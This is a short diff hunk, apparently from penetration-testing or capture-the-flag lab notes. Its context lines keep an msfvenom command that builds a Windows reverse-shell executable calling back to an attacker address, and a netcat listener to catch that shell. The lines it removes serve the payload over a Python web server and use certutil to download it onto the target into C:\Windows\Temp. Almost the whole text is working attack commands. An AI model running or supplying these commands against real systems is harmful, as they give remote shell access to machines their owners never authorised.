@@ -16,7 +16,3 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.xxx.xxx LPORT=4444 -f exe -o s
 
 nc -lvnp 4444
 
-
-python3 -m http.server 8080
-
-certutil -urlcache -split -f http://10.10.xxx.xxx:8080/shell2.exe C:\Windows\Temp\shell2.exe
